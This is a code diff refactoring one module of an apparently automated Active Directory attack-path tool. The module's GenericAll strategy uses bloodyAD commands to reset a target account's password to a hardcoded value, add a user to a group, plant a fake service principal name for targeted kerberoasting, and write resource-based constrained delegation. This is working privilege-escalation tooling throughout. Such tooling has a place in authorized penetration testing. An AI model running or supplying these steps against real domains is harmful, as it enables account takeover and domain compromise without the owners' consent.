@@ -8,11 +8,12 @@ from entities.node_kind import NodeKind
 from entities.exploit_result import ExploitResult
 from entities.edge_kind import EdgeKind
 from exceptions.hop_failed_error import HopFailedError
-from services.printing import print_check, print_warning, print_done
-from utils.runner import run_tool
+from services.printing import print_check, print_done
 from utils.platform import BACKEND
 from utils.runner import run_tool
-from utils.cred_store import enrich_creds
+from references.cred_store import enrich_creds
+from entities.credentials import Credential
+from utils.bloodyad import bloodyad_cmd
 
 @dataclass
 class GenericAllStrategy(ExploitStrategy):
@@ -73,7 +74,7 @@ class GenericAllStrategy(ExploitStrategy):
         """
         target_sam  = self.target.sam()
         new_password = "AutoPwn@1337!" # hardcoded here
-        ok, output = run_tool(_bloodyad(creds, subcommand=[
+        ok, output = run_tool(bloodyad_cmd(creds, subcommand=[
     		"set", "password", target_sam, new_password
 		]))
         if not ok:
@@ -88,19 +89,19 @@ class GenericAllStrategy(ExploitStrategy):
                   f"  Username: {target_sam}\n"
                   f"  Password: {new_password}\n"
                   f"  Domain: {creds['domain']}",
-            gained_access={
-                "username": target_sam,
-                "password": new_password,
-                "domain": creds.get("domain"),
-                "dc_ip": creds.get("dc_ip")
-            }
+            gained_access=Credential(
+                username=target_sam,
+                password=new_password,
+                domain=creds.get("domain"),
+                dc_ip=creds.get("dc_ip")
+            )
         )
 
     def _add_member(self, creds: dict) -> ExploitResult:
         group_sam  = self.target.sam()
         victim_sam = self.victim.sam()
 
-        ok, output = run_tool(_bloodyad(creds, [
+        ok, output = run_tool(bloodyad_cmd(creds, [
             "add", "groupMember", group_sam, victim_sam
         ]))
 
@@ -108,12 +109,12 @@ class GenericAllStrategy(ExploitStrategy):
             raise HopFailedError(self.edge, f"AddMember failed:\n{output}")
 
         print_done(f"{victim_sam} added to {group_sam}")
-        return ExploitResult(success=True, output=output, technique="AddMember")
+        return ExploitResult(technique="AddMember", edge=self.edge, success=True,notes=f"{victim_sam} ajouté au groupe {group_sam}")
 
     def _targeted_kerberoast(self, creds: dict) -> ExploitResult:
         target_sam = self.target.sam()
 
-        ok, output = run_tool(_bloodyad(creds, [
+        ok, output = run_tool(bloodyad_cmd(creds, [
             "set", "object", target_sam,
             "servicePrincipalNames",
             f"fake/roast.{creds['domain']}"
@@ -129,7 +130,7 @@ class GenericAllStrategy(ExploitStrategy):
         target_sam   = self.target.sam()
         attacker_sam = self.attacker.sam()
 
-        ok, output = run_tool(_bloodyad(creds, [
+        ok, output = run_tool(bloodyad_cmd(creds, [
             "add", "rbcd", target_sam, attacker_sam
         ]))
 
@@ -137,17 +138,5 @@ class GenericAllStrategy(ExploitStrategy):
             raise HopFailedError(self.edge, f"RBCD write failed:\n{output}")
 
         print_done(f"RBCD set: {attacker_sam} → {target_sam}")
-        return ExploitResult(success=True, output=output, technique="RBCD")
-
-# ── Helpers ───────────────────────────────────────────────────────────────────
-
-# TODO: Add support to add/set/remove subcommands clearly
-def _bloodyad(creds: dict, subcommand: list[str]) -> list[str]: #creds maybe class?
-    cmd = [
-        "-H", creds["dc_ip"],
-        "-d", creds["domain"],
-        "-u", creds["username"],
-    ]
-    cmd += ["-p", creds.get("secret","")]
-    print(f"DEBUG : {cmd + subcommand}")
-    return cmd + subcommand
+        return ExploitResult(technique="RBCD",edge=self.edge,success=True,
+                            notes=f"RBCD configuré : {attacker_sam} peut s'authentifier en tant que {target_sam}")
